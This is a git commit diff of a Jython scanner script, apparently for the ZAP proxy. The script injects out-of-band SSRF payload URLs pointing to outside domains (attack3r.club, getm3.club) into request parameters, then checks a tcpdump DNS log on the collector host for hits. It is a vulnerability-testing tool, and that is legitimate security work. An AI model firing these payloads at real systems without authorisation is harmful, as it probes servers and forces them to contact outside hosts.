68854ac0d7649d5d5a14dc87e12d785d053ab25e
ronoski <kiennv.bk@gmail.com>
2020-11-14 23:36:48 +0700

    Add files via upload
    update obb-ssrf.py

--- active/obb-ssrf.py
+++ active/obb-ssrf.py
@@ -16,30 +16,33 @@ import random
 
 def checkDnsHit(prefix_payload):
 	client =  org.apache.http.impl.client.DefaultHttpClient()
-	request = org.apache.http.client.methods.HttpGet("http://attack3r.club/tcpdumpron.txt")
+	request = org.apache.http.client.methods.HttpGet("http://attack3r.club/tcpdumpron.txt") 
+	#tcpdump -n port 53 | tee -a tcpdumpron.txt
 	response = client.execute(request);
 	
 	responseString = org.apache.http.util.EntityUtils.toString(response.getEntity(), "UTF-8");
 	body = str(responseString)
-	if prefix_payload in body:
+	if prefix_payload in body or prefix_payload.upper() in body:
 		return True
 	else:
  		return False
 
 
-payloads = ['http://ssrfpoc.obb.attack3r.club', 'https://ssrfpoc.obb.attack3r.club', 'ssrfpoc.obb.attack3r.club']
+payloads = ['http://ssrfpoc.getm3.club', 'https://ssrfpoc.getm3.club', 'ssrfpoc.getm3.club', 'http://ssrfpoc.obb.attack3r.club', 'https://ssrfpoc.obb.attack3r.club', 'ssrfpoc.obb.attack3r.club']
 positive_responses = ['Exception', 'exception']
 
 def scanNode(sas, msg):
   # Debugging can be done using print like this
-  print('scan called for url=' + msg.getRequestHeader().getURI().toString());
+  #print('--scan called for url=' + msg.getRequestHeader().getURI().toString());
 
   # Copy requests before reusing them
   msg = msg.cloneRequest();
 
   # sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
-  sas.sendAndReceive(msg, False, False);
-
+  try:
+  	sas.sendAndReceive(msg, False, False);
+  except:
+	print("Error when send http req")
   # Test the responses and raise alerts as below
 
 
@@ -47,9 +50,12 @@ def scan(sas, msg, param, value):
   # Debugging can be done using print like this
   print('scan called for url=' + msg.getRequestHeader().getURI().toString() + 
     ' param=' + param + ' value=' + value);
+  	
   for p in payloads:
-	payload = p.replace("ssrfpoc", "ssrfpoc" + str(random.randint(1000, 99999)))
+	prefix="ssrfpoc" + str(random.randint(100000, 999999))
+	payload = p.replace("ssrfpoc",prefix )
   	# Copy requests before reusing them
+	
   	msg_clone = msg.cloneRequest();
 	
   	# setParam (message, parameterName, newValue)
@@ -59,15 +65,10 @@ def scan(sas, msg, param, value):
 	try:
   		sas.sendAndReceive(msg_clone, False, False);
 		res_body_str = msg_clone.getResponseBody().toString()
-  		# Test the response here, and make other requests as required
-		time.sleep(1)
-  		if checkDnsHit(payload.upper()):
-  		# Change to a test which detects the vulnerability
-	    	# raiseAlert(risk, int reliability, String name, String description, String uri, 
-	   	#		String param, String attack, String otherInfo, String solution, String evidence, 
-	    	#		int cweId, int wascId, HttpMessage msg)
-	    	# risk: 0: info, 1: low, 2: medium, 3: high
-	   	# reliability: 0: falsePassitive, 1: suspicious, 2: warning
-    			sas.raiseAlert(3, 2, 'Server Side Request Forgery', 'SSRF Detected', msg_clone.getRequestHeader().getURI().toString(), param, payload, 'Any other info', 'The solution ', '' , 0, 0, msg_clone);
 	except:
 		print('Error sending request')
+	time.sleep(3)
+	if checkDnsHit(prefix):
+		sas.raiseAlert(3, 2, 'Server Side Request Forgery', 'SSRF Detected', msg_clone.getRequestHeader().getURI().toString(), param, payload, 'Any other info', 'The solution ', '' , 0, 0, msg_clone);
+	
+	
